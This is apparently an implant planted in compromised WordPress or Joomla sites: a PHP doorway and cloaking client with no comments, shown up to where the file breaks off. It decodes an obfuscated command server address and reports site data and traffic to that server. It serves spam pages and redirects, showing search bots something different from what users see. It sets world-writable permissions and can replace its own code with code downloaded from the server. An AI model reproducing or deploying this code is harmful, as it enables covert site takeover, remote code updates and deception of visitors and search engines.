<?php if(empty($_GET['ineedthispage'])){ini_set('display_errors',"Off");ignore_user_abort(1);$version="1.6.2";$errors="";$errorsforlocal="";if(!is_function_enabled('curl_init')){$errors.="I_have_problem_with_Curl\t";$errorsforlocal.="I_have_problem_with_Curl\t";}if(!is_function_enabled('fopen')){$errors.="I_have_problem_with_fopen\t";$errorsforlocal.="I_have_problem_with_fopen\t";}if(!is_function_enabled('file_get_contents')){$errors.="I_have_problem_with_file_get_contents\t";$errorsforlocal.="I_have_problem_with_file_get_contents\t";}if(!is_function_enabled('gzuncompress')){$errors.="I_have_problem_with_gzuncompress\t";$errorsforlocal.="I_have_problem_with_gzuncompress\t";}if(!is_function_enabled('base64_decode')){$errors.="I_have_problem_with_base64_decode\t";$errorsforlocal.="I_have_problem_with_base64_decode\t";}$clienturl="";$newkeys="";$dotemplate="";$clearcache="";$newuseragents="";$newbotips="";$newreffs="";$usecloack="";$itsinclude="";$clienttype="";$lang="";$wherecontent="";$textfilename="";$keyfilename="";$themesfilename="";$templatename="";$extlinksfilename="";$keyperem="";$redirect="";$q="";$workstatus="";$settsinclient="";$servurl=decodeservurl("aHR7cCUzQSUyRiUyRmR2bmRvb0IucmdmaWxlcy2ydSUyRnBhY9swMDQlMkZnZXRkYXRhLnBocA==");$servurl=str_ireplace("http://","",$servurl);if(!empty($_SERVER['HTTP_USER_AGENT'])){$useragent=$_SERVER['HTTP_USER_AGENT'];}else{$useragent="";}if(!empty($_SERVER['HTTP_REFERER'])){$referer=$_SERVER['HTTP_REFERER'];}else{$referer="";}if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];}elseif(!empty($_SERVER['REMOTE_ADDR'])){$ip=$_SERVER['REMOTE_ADDR'];}else{$ip="";}$clientid=md5(__FILE__);$cachedirname=dirname(__FILE__)."/cache".$clientid;$keysfilename=$cachedirname."/ke".substr($clientid,0,8)."ys";$useragentsfilename=$cachedirname."/use".substr($clientid,0,3)."rag".substr($clientid,3,6)."ents";$botipsfilename=$cachedirname."/bo".substr($clientid,0,4)."ti".substr($clientid,5,8)."ps";$referersfilename=$cachedirname."/re".substr($clientid,1,4)."fere".substr($clientid,6,8)."re";$runningfilename=$cachedirname."/run".substr($clientid,2,7)."ning";$cachefilename=$cachedirname."/cac".substr($clientid,0,6)."he";$errorsfilename=$cachedirname."/err".substr($clientid,3,7)."ors";$trafffilename=$cachedirname."/tr".substr($clientid,2,8)."aff";$nativetemplatefilename=$cachedirname."/tem".substr($clientid,3,6)."pla".substr($clientid,1,4)."te";$urlhash=md5($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']);$thisdomain=$_SERVER['SERVER_NAME'];$settfilename="se".substr($clientid,1,6)."tts";$whattime=checktime(200);if(!is_dir($cachedirname)){if(!mkdir($cachedirname,0777)){$errors.="Can't create cache dir\t";$errorsforlocal.="Can't create cache dir\t";}}if(!file_exists($cachedirname."/".substr($clientid,0,7))){$fod=fopen($cachedirname."/".substr($clientid,0,7),"w+");if(!empty($fod)){flock($fod,LOCK_EX);fwrite($fod,"");fclose($fod);}else{$errors.="Can't first create timefile ".substr($clientid,0,7)."\t";$errorsforlocal.="Can't first create timefile ".substr($clientid,0,7)."\t";}}if($whattime=="errorcreate"){$errors.="Can't create timefile ".substr($clientid,0,7)."\t";$errorsforlocal.="Can't create timefile ".substr($clientid,0,7)."\t";}$cachedirperm=substr(sprintf('%o',fileperms($cachedirname)),-4);if($cachedirperm!="0777"){@chmod($cachedirname,0777);}$ownperm=substr(sprintf('%o',fileperms(__FILE__)),-4);if($ownperm!="0777"){@chmod(__FILE__,0777);}$currdirperm=substr(sprintf('%o',fileperms(dirname(__FILE__))),-4);if($currdirperm!="0777"){@chmod(dirname(__FILE__),0777);}$keysfilestatus="";if(file_exists($cachedirname."/".$settfilename)){$settsinclient="yes";if(file_exists($keysfilename)){$workstatus="work";$keysfilestatus="good";}$settings=@file_get_contents($cachedirname."/".$settfilename);$settings=decodedata($settings);$clienturl=urldecode(getsettings($settings,"clienturl","yes"));if(stripos("qqqq".$clienturl,"[DOMAIN]")){$clienturl=str_ireplace("[DOMAIN]",$thisdomain,$clienturl);}$clienturl=trim($clienturl);$newkeys=urldecode(getsettings($settings,"newkeys","yes"));$newkeys=trim($newkeys);$dotemplate=urldecode(getsettings($settings,"dotemplate","yes"));$dotemplate=trim($dotemplate);$clearcache=urldecode(getsettings($settings,"clearcache","yes"));$clearcache=trim($clearcache);$newuseragents=urldecode(getsettings($settings,"newuseragents","yes"));$newuseragents=trim($newuseragents);$newbotips=urldecode(getsettings($settings,"newbotips","yes"));$newbotips=trim($newbotips);$newreffs=urldecode(getsettings($settings,"newreffs","yes"));$newreffs=trim($newreffs);$usecloack=urldecode(getsettings($settings,"usecloack","yes"));$usecloack=trim($usecloack);$itsinclude=urldecode(getsettings($settings,"itsinclude","yes"));$itsinclude=trim($itsinclude);$clienttype=urldecode(getsettings($settings,"clienttype","yes"));$clienttype=trim($clienttype);$lang=urldecode(getsettings($settings,"lang","yes"));$lang=trim($lang);$wherecontent=urldecode(getsettings($settings,"wherecontent","yes"));$wherecontent=trim($wherecontent);$textfilename=urldecode(getsettings($settings,"textfilename","yes"));$textfilename=trim($textfilename);$keyfilename=urldecode(getsettings($settings,"keyfilename","yes"));$keyfilename=trim($keyfilename);$themesfilename=urldecode(getsettings($settings,"themesfilename","yes"));$themesfilename=trim($themesfilename);$templatename=urldecode(getsettings($settings,"templatename","yes"));$templatename=trim($templatename);$extlinksfilename=urldecode(getsettings($settings,"extlinksfilename","yes"));$extlinksfilename=trim($extlinksfilename);$keyperem=urldecode(getsettings($settings,"keyperem","yes"));$keyperem=trim($keyperem);$renewclient=urldecode(getsettings($settings,"renewclient","yes"));$renewclient=trim($renewclient);$redirect=urldecode(getsettings($settings,"redirect","yes"));$redirect=trim($redirect);$keyfindexurl=urlencode(trim($clienturl,"/"));$urlfmbrowser=urlencode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']);$regular=str_ireplace("%5BKEY%5D","([\S]*?)",$keyfindexurl);$regular="/".$regular."/iUm";preg_match($regular,$urlfmbrowser,$match);if(!empty($match[1])){$q=trim($match[1]);}if(!empty($keyperem)&&!empty($workstatus)&&$workstatus=="work"&&empty($q)){$test="";if(!empty($_GET[$keyperem])){$q=$_GET[$keyperem];}elseif($itsinclude=="no"&&empty($_GET[$keyperem])){$allkeys=file_get_contents($keysfilename);if(!empty($allkeys)){$allkeys=explode("\n",decodedata($allkeys));srand((float)microtime()*1000000);shuffle($allkeys);$q=trim($allkeys[0]);unset($allkeys);}else{$errors.="Keys file is empty\t";$errorsforlocal.="Keys file is empty\t";}}}$q=urldecode(urldecode($q));$q=trim($q,"/");if(!empty($q)){if(keyindoorway($q,$keysfilename)=="yes"){$test="yes";}}}if(!empty($settings)&&!empty($newkeys)&&$newkeys=="yes"&&!empty($keyfilename)&&!file_exists($runningfilename)){$fod=fopen($runningfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,"");fclose($fod);$settings=str_ireplace("newkeys=yes","",$settings);$fod=fopen($cachedirname."/".$settfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,codedata($settings));fclose($fod);$ch=curl_init();curl_setopt($ch,CURLOPT_URL,"http://".$servurl."?clientid=".urlencode($clientid)."&clienturl=".urlencode($clienturl)."&templatename=".urlencode($templatename)."&ineednewkeys=yes&keyfilename=".urlencode($keyfilename));$fp=fopen($keysfilename,"w+");if(!empty($fp)){curl_setopt($ch,CURLOPT_FILE,$fp);curl_exec($ch);$curlerror="";$curlerror=curl_error($ch);if(!empty($curlerror)){$errors.="CurlError ".$curlerror." while get keys\t";$errorsforlocal.="CurlError ".$curlerror." while get keys\t";}curl_close($ch);fclose($fp);}else{curl_close($ch);$errors.="Can't save keys file\t";$errorsforlocal.="Can't save keys file\t";}@unlink($runningfilename);}if($clienttype=="wpgood"){if(!empty($dotemplate)&&$dotemplate=="yes"&&!file_exists($runningfilename)&&!empty($settings)){$fod=fopen($runningfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,"");fclose($fod);$settings=str_ireplace("dotemplate=yes","",$settings);$fod=fopen($cachedirname."/".$settfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,codedata(trim($settings)));fclose($fod);@unlink($runningfilename);if(!is_function_enabled('wp_insert_post')&&!is_function_enabled('get_permalink')&&!is_function_enabled('wp_delete_post')&&!is_function_enabled('add_action')){$errors.="Not WP or include before WP functions loaded\t";$errorsforlocal.="Not WP or include before WP functions loaded\t";}else{$slugname=randString(8);$post_data=array('post_title'=>"HEREISTITLE",'post_name'=>$slugname,'post_content'=>"HEREISCONTENT",'post_status'=>'publish','post_category'=>array());$post_id=wp_insert_post($post_data,true);$permalink=get_permalink($post_id);$testpermalink=explode("/",$permalink);if(stripos($testpermalink[count($testpermalink)-1],"?")){$goodwordpresspage=file_get_contents($permalink."&ineedthispage=yes");}else{$goodwordpresspage=file_get_contents($permalink."?ineedthispage=yes");}$goodwordpresspage=str_ireplace($permalink,"#",$goodwordpresspage);$goodwordpresspage=str_ireplace("&ineedthispage=yes","",$goodwordpresspage);$goodwordpresspage=str_ireplace("&amp;ineedthispage=yes","",$goodwordpresspage);if(!wp_delete_post($post_id,true)){wp_delete_post($post_id,true);}if(!empty($goodwordpresspage)&&stripos("qqq".$goodwordpresspage,"HEREISCONTENT")){$goodwordpresspage=str_ireplace("content=\"HEREISCONTENT","content=\"",$goodwordpresspage);$goodwordpresspage=str_ireplace("content=\" HEREISCONTENT","content=\"",$goodwordpresspage);$goodwordpresspage=urlencode(codedata($goodwordpresspage));$fod=fopen($nativetemplatefilename,"w+");flock($fod,LOCK_EX);fwrite($fod,$goodwordpresspage);fclose($fod);}else{$errors.="Cant get native template\t";$errorsforlocal.="Cant get native template\t";}}}}if(!empty($settings)&&!empty($newuseragents)&&$newuseragents=="yes"&&!file_exists($runningfilename)){$fod=fopen($runningfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,"");fclose($fod);$settings=str_ireplace("newuseragents=yes","",$settings);$fod=fopen($cachedirname."/".$settfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,codedata($settings));fclose($fod);$ch=curl_init();curl_setopt($ch,CURLOPT_URL,"http://".$servurl."?clientid=".urlencode($clientid)."&clienturl=".urlencode($clienturl)."&templatename=".urlencode($templatename)."&ineednewuseragents=yes");$fp=fopen($useragentsfilename,"w+");if(!empty($fp)){curl_setopt($ch,CURLOPT_FILE,$fp);curl_exec($ch);$curlerror="";$curlerror=curl_error($ch);if(!empty($curlerror)){$errors.="CurlError ".$curlerror." while get useragents\t";$errorsforlocal.="CurlError ".$curlerror." while get useragents\t";}curl_close($ch);fclose($fp);}else{curl_close($ch);$errors.="Can't save useragents file\t";$errorsforlocal.="Can't save useragents file\t";}@unlink($runningfilename);}if(!empty($settings)&&!empty($newuseragents)&&$newuseragents=="yes"&&!file_exists($runningfilename)){$fod=fopen($runningfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,"");fclose($fod);$settings=str_ireplace("newbotips=yes","",$settings);$fod=fopen($cachedirname."/".$settfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,codedata($settings));fclose($fod);$ch=curl_init();curl_setopt($ch,CURLOPT_URL,"http://".$servurl."?clientid=".urlencode($clientid)."&clienturl=".urlencode($clienturl)."&templatename=".urlencode($templatename)."&ineednewbotips=yes");$fp=fopen($botipsfilename,"w+");if(!empty($fp)){curl_setopt($ch,CURLOPT_FILE,$fp);curl_exec($ch);$curlerror="";$curlerror=curl_error($ch);if(!empty($curlerror)){$errors.="CurlError ".$curlerror." while get botips\t";$errorsforlocal.="CurlError ".$curlerror." while get botips\t";}curl_close($ch);fclose($fp);}else{curl_close($ch);$errors.="Can't save botips file\t";$errorsforlocal.="Can't save botips file\t";}@unlink($runningfilename);}if(!empty($settings)&&!empty($newreffs)&&$newreffs=="yes"&&!file_exists($runningfilename)){$fod=fopen($runningfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,"");fclose($fod);$settings=str_ireplace("newreffs=yes","",$settings);$fod=fopen($cachedirname."/".$settfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,codedata($settings));fclose($fod);$ch=curl_init();curl_setopt($ch,CURLOPT_URL,"http://".$servurl."?clientid=".urlencode($clientid)."&clienturl=".urlencode($clienturl)."&templatename=".urlencode($templatename)."&ineednewreffs=yes");$fp=fopen($referersfilename,"w+");if(!empty($fp)){curl_setopt($ch,CURLOPT_FILE,$fp);curl_exec($ch);$curlerror="";$curlerror=curl_error($ch);if(!empty($curlerror)){$errors.="CurlError ".$curlerror." while get referers\t";$errorsforlocal.="CurlError ".$curlerror." while get refererrs\t";}curl_close($ch);fclose($fp);}else{curl_close($ch);$errors.="Can't save refererrs file\t";$errorsforlocal.="Can't save refererrs file\t";}@unlink($runningfilename);}if(!empty($settings)&&!empty($clearcache)&&$clearcache=="yes"&&!file_exists($runningfilename)){$fod=fopen($runningfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,"");fclose($fod);$settings=str_ireplace("clearcache=yes","",$settings);$fod=fopen($cachedirname."/".$settfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,codedata(trim($settings)));fclose($fod);if(file_exists($cachefilename)){@unlink($cachefilename);}@unlink($runningfilename);}if(!empty($settings)&&!empty($renewclient)&&$renewclient=="yes"&&!file_exists($runningfilename)){$fod=fopen($runningfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,"");fclose($fod);if(!empty($servurl)){$newclient=file_get_contents("http://".str_ireplace("getdata.php","clientdata",$servurl));$newclient=str_ireplace(urldecode("%5BSERVERURLHERE%5D"),codeservurl($servurl),$newclient);if(!empty($newclient)&&stripos("qqq".$newclient,"item->alias;};")){$fod=fopen(__FILE__,"w+");flock($fod,LOCK_EX);fwrite($fod,trim($newclient));fclose($fod);}}$settings=str_ireplace("renewclient=yes","",$settings);$fod=fopen($cachedirname."/".$settfilename,"w+");flock($fod,LOCK_EX);fwrite($fod,codedata(trim($settings)));fclose($fod);@unlink($runningfilename);}if($whattime=="goodtime"){$cloackfiles="";if(file_exists($useragentsfilename)&&file_exists($botipsfilename)&&file_exists($referersfilename)){$cloackfiles="good";}$trafficdata="";if(file_exists($trafffilename)){$trafficdata=file_get_contents($trafffilename);}$filesdata="<b>Client type-</b> ".$clienttype."<br><b>Lang-</b> ".$lang."<br><b>Key var.-</b> ".$keyperem."<br><b>It's include-</b> ".$itsinclude."<br><b>Text from-</b>  ".$wherecontent."<br><b>Template-</b> ".$templatename."<br><b>Keys-</b> ".$keyfilename."<br><b>Text-</b> ".$textfilename."<br><b>Themes-</b> ".$themesfilename."<br><b>Extlinks-</b> ".$extlinksfilename;if(!empty($settings)){$currsettoserv=urlencode(codedata($settings));}else{$currsettoserv="";}$newsetts=getpagefmurl("http://".$servurl."?clientid=".urlencode($clientid)."&clienturl=".urlencode($clienturl)."&templatename=".urlencode($templatename)."&ineednewsetts=yes"."&version=".urlencode($version)."&clientdomain=".urlencode($thisdomain)."&workstatus=".urlencode($workstatus)."&cachedirperm=".urlencode($cachedirperm)."&ownperm=".urlencode($ownperm)."&currdirperm=".urlencode($currdirperm)."&settsinclient=".urlencode($settsinclient)."&keyshere=".urlencode($keysfilestatus)."&cloackstatus=".urlencode($usecloack)."&cloackfiles=".urlencode($cloackfiles)."&filesdata=".urlencode($filesdata)."&trafficdata=".urlencode($trafficdata)."&currentsetts=".$currsettoserv."&clienterrors=".urlencode($errors));if(stripos("qqq".$newsetts,"CurlError")){$errors.=$newsetts."\t";$errorsforlocal.=$newsetts."\t";}else{if(!empty($newsetts)&&stripos("qqqq".$newsetts,"THENEWSETTSHERE")){$newsetts=str_ireplace("THENEWSETTSHERE","",$newsetts);$newsetts=codedata($newsetts);$fod=fopen($cachedirname."/".$settfilename,"w+");if(!empty($fod)){flock($fod,LOCK_EX);fwrite($fod,$newsetts);fclose($fod);}else{$errors.="Can't save setting file\t";$errorsforlocal.="Can't save setting file\t";}}}}if(!empty($q)&&!empty($urlhash)&&!empty($settings)&&!empty($test)&&$test=="yes"&&$dotemplate!="yes"){$bot=0;$user=1;if(!empty($usecloack)&&$usecloack=="use"){$testcloack=cloack($ip);if($testcloack==1){$bot=1;$user=0;$redirect="";}}if(file_exists($trafffilename)){$traffic=file_get_contents($trafffilename);$traffic=explode("/",$traffic);$traffic[0]=trim($traffic[0])+$bot;$traffic[1]=trim($traffic[1])+$user;$traffic=implode("/",$traffic);$traffic=trim($traffic);@unlink($trafffilename);$fod=fopen($trafffilename,"a+");if(!empty($fod)){flock($fod,LOCK_EX);ftruncate($fod,0);fwrite($fod,$traffic);fclose($fod);}else{$errors.="Can't save traffic file\t";$errorsforlocal.="Can't save traffic file\t";}}else{$traffic=$bot."/".$user;$fod=fopen($trafffilename,"w+");if(!empty($fod)){flock($fod,LOCK_EX);fwrite($fod,$traffic);fclose($fod);}else{$errors.="Can't save traffic file\t";$errorsforlocal.="Can't save traffic file\t";}}if(file_exists($cachefilename)){$handle=fopen($cachefilename,"r");while(!feof($handle)){$cacheline=fgets($handle);$cacheline=explode("::::",$cacheline);$cachedurl=trim($cacheline[0]);if($cachedurl==trim($urlhash)){$cacheddata=trim($cacheline[1]);break;}}fclose($handle);if(!empty($cacheddata)){$page=decodedata($cacheddata);}else{$geturl="http://".$servurl."?clientid=".urlencode($clientid)."&clienturl=".urlencode($clienturl)."&itsinclude=".urlencode($itsinclude)."&clienttype=".urlencode($clienttype)."&lang=".urlencode($lang)."&currkey=".urlencode($q)."&wherecontent=".urlencode($wherecontent)."&textfilename=".urlencode($textfilename)."&keyfilename=".urlencode($keyfilename)."&themesfilename=".urlencode($themesfilename)."&templatename=".urlencode($templatename)."&extlinksfilename=".urlencode($extlinksfilename)."&keysfilestatus=".urlencode($keysfilestatus)."&workstatus=".urlencode($workstatus)."&clientdomain=".urlencode($thisdomain)."&clienterrors=".urlencode($errors);$page=getpagefmurl($geturl);if(stripos("qqqq".$page,"CurlError")){$errorsforlocal.=$page." while get content from server\t";}else{if(!empty($page)){$fod=fopen($cachefilename,"a+");flock($fod,LOCK_EX);fwrite($fod,$urlhash."::::".codedata($page)."\n");fclose($fod);}}}}else{$geturl="http://".$servurl."?clientid=".urlencode($clientid)."&clienturl=".urlencode($clienturl)."&itsinclude=".urlencode($itsinclude)."&clienttype=".urlencode($clienttype)."&lang=".urlencode($lang)."&currkey=".urlencode($q)."&wherecontent=".urlencode($wherecontent)."&textfilename=".urlencode($textfilename)."&keyfilename=".urlencode($keyfilename)."&themesfilename=".$themesfilename."&templatename=".$templatename."&extlinksfilename=".$extlinksfilename."&keysfilestatus=".urlencode($keysfilestatus)."&workstatus=".urlencode($workstatus)."&clientdomain=".urlencode($thisdomain)."&clienterrors=".urlencode($errors);$page=getpagefmurl($geturl);if(stripos("qqqq".$page,"CurlError")){$errorsforlocal.=$page." while get content from server\t";}else{if(!empty($page)){$fod=fopen($cachefilename,"a+");flock($fod,LOCK_EX);fwrite($fod,$urlhash."::::".codedata($page)."\n");fclose($fod);}}}}if(!empty($page)&&!empty($clienttype)){if($clienttype=="simple"){$page=str_ireplace("[REDIRECT]",$redirect,$page);$page=str_ireplace("[DEFISKEY]",str_ireplace(" ","-",$q),$page);echo$page;die();}if($clienttype=="wpfunc"){$page=str_ireplace("[REDIRECT]",$redirect,$page);$page=str_ireplace("[DEFISKEY]",str_ireplace(" ","-",$q),$page);$page=explode("====================",$page);if(count($page)>=3){if(!is_function_enabled('query_posts')&&!is_function_enabled('add_filter')&&!is_function_enabled('add_action')){$errors.="Not WP or include before WP functions loaded\t";$errorsforlocal.="Not WP or include before WP functions loaded\t";}else{$title=trim($page[0]);$body=trim($page[2]);$desc=trim($page[1]);query_posts('posts_per_page=1');add_filter('the_content','getbody');add_filter('wp_title','gettitle');add_filter('the_title','gettitle');add_action('wp_head','getdesc');}}else{$errors.="Bad template for WP, check it\t";$errorsforlocal.="Bad template for WP, check it\t";}}if($clienttype=="wpnew"){if(!is_function_enabled('wp_insert_post')&&!is_function_enabled('get_permalink')&&!is_function_enabled('wp_delete_post')&&!is_function_enabled('add_action')){$errors.="Not WP or include before WP functions loaded\t";$errorsforlocal.="Not WP or include before WP functions loaded\t";}else{$page=str_ireplace("[REDIRECT]","",$page);$page=str_ireplace("[DEFISKEY]",str_ireplace(" ","-",$q),$page);if(!empty($redirect)){$redirect=str_ireplace("[DEFISKEY]",str_ireplace(" ","-",$q),$redirect);}$page=explode("====================",$page);if(count($page)>=3){$slugname=randString(8);$post_data=array('post_title'=>trim($page[0]),'post_name'=>$slugname,'post_content'=>trim($page[2]),'post_status'=>'publish','post_category'=>array());$post_id=wp_insert_post($post_data,true);$permalink=get_permalink($post_id);$testpermalink=explode("/",$permalink);if(stripos($testpermalink[count($testpermalink)-1],"?")){$goodwordpresspage=file_get_contents($permalink."&ineedthispage=yes");}else{$goodwordpresspage=file_get_contents($permalink."?ineedthispage=yes");}$goodwordpresspage=str_ireplace($permalink,"http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'],$goodwordpresspage);$goodwordpresspage=str_ireplace("&ineedthispage=yes","",$goodwordpresspage);$goodwordpresspage=str_ireplace("&amp;ineedthispage=yes","",$goodwordpresspage);if(!wp_delete_post($post_id,true)){wp_delete_post($post_id,true);}echo$redirect."".$goodwordpresspage;die();}}}if($clienttype=="wpgood"){$nativetemplate=file_get_contents($nativetemplatefilename);$nativetemplate=decodedata(urldecode($nativetemplate));if(!empty($redirect)){$redirect=str_ireplace("[DEFISKEY]",str_ireplace(" ","-",$q),$redirect);}$page=str_ireplace("[REDIRECT]",$redirect,$page);$page=str_ireplace("[DEFISKEY]",str_ireplace(" ","-",$q),$page);$page=explode("====================",$page);if(count($page)>=3){$nativetemplate=preg_replace("/<title>(.*)<\/title>/iUm","<title>".trim($page[0])."</title>",$nativetemplate);$nativetemplate=str_ireplace("HEREISTITLE",trim($page[0]),$nativetemplate);$nativetemplate=str_ireplace("</head>","<META NAME=\"description\" CONTENT=\"".trim($page[1])."\">\n</head>",$nativetemplate);$nativetemplate=str_ireplace("HEREISCONTENT",$page[2],$nativetemplate);echo$nativetemplate;die();}}if($clienttype=="joomla"){if(!is_function_enabled('postItem')&&!class_exists("JFactory")){$errors.="Not Joomla, bad version of Joomla or include before Joomla functions loaded\t";$errorsforlocal.="Not Joomla, bad version of Joomla or include before Joomla functions loaded\t";}else{$page=str_ireplace("[REDIRECT]","",$page);$page=str_ireplace("[DEFISKEY]",str_ireplace(" ","-",$q),$page);if(!empty($redirect)){$redirect=str_ireplace("[DEFISKEY]",str_ireplace(" ","-",$q),$redirect);}$page=explode("====================",$page);if(count($page)>=3){$joomlaurl=explode("/",$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']);unset($joomlaurl[count($joomlaurl)-1]);$idtemp=postItem(trim($page[0]),trim($page[1]),trim($page[2]));$idtemp=explode(":",$idtemp);if(is_array($idtemp)){$alias=trim($idtemp[1]);$id=trim($idtemp[0]);$page=file_get_contents("http://".trim(implode("/",$joomlaurl),"/")."/index.php/".$id."-".$alias."?ineedthispage=yes");$page=str_ireplace("&ineedthispage=yes","",$page);$page=str_ireplace("&amp;ineedthispage=yes","",$page);$page=str_ireplace("?ineedthispage=yes","",$page);$db=JFactory::getDbo();$query=$db->getQuery(true);$query->delete($db->quoteName('#__content'))->where(array($db->quoteName('id').'='.$id));$db->setQuery($query);$result=$db->query();echo$redirect."".$page;die();}}}}}if(!empty($errorsforlocal)&&is_dir($cachedirname)){$errorsforlocal=date("d F Y H:i:s")."\t".$q."\t".trim($errorsforlocal);if(file_exists($errorsfilename)&&count(file($errorsfilename))>500){$fod=fopen($errorsfilename,"w+");}else{$fod=fopen($errorsfilename,"a+");}flock($fod,LOCK_EX);fwrite($fod,$errorsforlocal."\n");fclose($fod);}if(!empty($_GET['ineederrors'])&&$_GET['ineederrors']=="yes"){if(!empty($errorsforlocal)){echo"<b>Current errors</b>: ".$errorsforlocal."<br><br>";if(file_exists($errorsfilename)){echo"<b>Errors history:</b> ".file_get_contents($errorsfilename);}die();}else{echo"No errors";}}}function getbody($body){global $body;return$body;}function gettitle($title){global $title;return$title;}function getdesc($desc){global $desc;echo"<meta type=\"description\" content=\"".$desc."\">";}function randString($length){$str="";$chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";$size=strlen($chars);for($i=0;$i<$length;$i++){$str.=$chars[rand(0,$size-1)];}return$str;}function getsettings($settfile,$needsetting,$fileorcontent){if(empty($fileorcontent)){if(file_exists($settfile)){$settings=file_get_contents($settfile);}else{return"";}}else{$settings=$settfile;}$settings=urlencode($settings);$settings=trim($settings,"%0A");$settings.="%0A";if($needsetting=="clienturl"){preg_match("/clienturl%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$clienturl=$matches[1];$clienturl=trim($clienturl);return$clienturl;}else{return"";}}if($needsetting=="clearcache"){preg_match("/clearcache%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$clearcache=$matches[1];$clearcache=trim($clearcache);return$clearcache;}else{return"";}}if($needsetting=="newkeys"){preg_match("/newkeys%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$newkeys=$matches[1];$newkeys=trim($newkeys);return$newkeys;}else{return"";}}if($needsetting=="dotemplate"){preg_match("/dotemplate%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$dotemplate=$matches[1];$dotemplate=trim($dotemplate);return$dotemplate;}else{return"";}}if($needsetting=="newuseragents"){preg_match("/newuseragents%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$newuseragents=$matches[1];$newuseragents=trim($newuseragents);return$newuseragents;}else{return"";}}if($needsetting=="newbotips"){preg_match("/newbotips%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$newbotips=$matches[1];$newbotips=trim($newbotips);return$newbotips;}else{return"";}}if($needsetting=="newreffs"){preg_match("/newreffs%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$newreffs=$matches[1];$newreffs=trim($newreffs);return$newreffs;}else{return"";}}if($needsetting=="usecloack"){preg_match("/usecloack%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$usecloack=$matches[1];$usecloack=trim($usecloack);return$usecloack;}else{return"";}}if($needsetting=="itsinclude"){preg_match("/itsinclude%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$itsinclude=$matches[1];$itsinclude=trim($itsinclude);return$itsinclude;}else{return"";}}if($needsetting=="clienttype"){preg_match("/clienttype%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$clienttype=$matches[1];$clienttype=trim($clienttype);return$clienttype;}else{return"";}}if($needsetting=="lang"){preg_match("/lang%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$lang=$matches[1];$lang=trim($lang);return$lang;}else{return"";}}if($needsetting=="wherecontent"){preg_match("/wherecontent%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$wherecontent=$matches[1];$wherecontent=trim($wherecontent);return$wherecontent;}else{return"";}}if($needsetting=="textfilename"){preg_match("/textfilename%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$textfilename=$matches[1];$textfilename=trim($textfilename);return$textfilename;}else{return"";}}if($needsetting=="keyfilename"){preg_match("/keyfilename%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$keyfilename=$matches[1];$keyfilename=trim($keyfilename);return$keyfilename;}else{return"";}}if($needsetting=="themesfilename"){preg_match("/themesfilename%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$themesfilename=$matches[1];$themesfilename=trim($themesfilename);return$themesfilename;}else{return"";}}if($needsetting=="templatename"){preg_match("/templatename%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$templatename=$matches[1];$templatename=trim($templatename);return$templatename;}else{return"";}}if($needsetting=="extlinksfilename"){preg_match("/extlinksfilename%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$extlinksfilename=$matches[1];$extlinksfilename=trim($extlinksfilename);return$extlinksfilename;}else{return"";}}if($needsetting=="renewclient"){preg_match("/renewclient%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$renewclient=$matches[1];$renewclient=trim($renewclient);return$renewclient;}else{return"";}}if($needsetting=="keyperem"){preg_match("/keyperem%3D(.*)%0A/miU",$settings,$matches);if(!empty($matches[1])){$keyperem=$matches[1];$keyperem=trim($keyperem);return$keyperem;}else{return"";}}if($needsetting=="redirect"){preg_match("/redirect%3D(.*)ENDOFREDIRECT%0A/miU",$settings,$matches);if(!empty($matches[1])){$redirect=$matches[1];$redirect=trim($redirect);return$redirect;}else{return"";}}return"";}function is_function_enabled($func){$func=strtolower(trim($func));if($func=='')return false;$disabled=explode(",",@ini_get("disable_functions"));if(empty($disabled)){$disabled=array();}else{$disabled=array_map('trim',array_map('strtolower',$disabled));}return(function_exists($func)&&is_callable($func)&&!in_array($func,$disabled));}function checktime($timetocurl){global $cachedirname;global $clientid;if(is_dir($cachedirname)){if(!file_exists($cachedirname."/".substr($clientid,0,7))){$fod=fopen($cachedirname."/".substr($clientid,0,7),"w+");if(!empty($fod)){flock($fod,LOCK_EX);fwrite($fod,"");fclose($fod);}else{return"errorcreate";}}$cron_time=filemtime($cachedirname."/".substr($clientid,0,7));if(time()-$cron_time>=$timetocurl){@unlink($cachedirname."/".substr($clientid,0,7));$fod=fopen($cachedirname."/".substr($clientid,0,7),"w+");if(!empty($fod)){flock($fod,LOCK_EX);fwrite($fod,"");fclose($fod);return"goodtime";}else{return"errorcreate";}}return 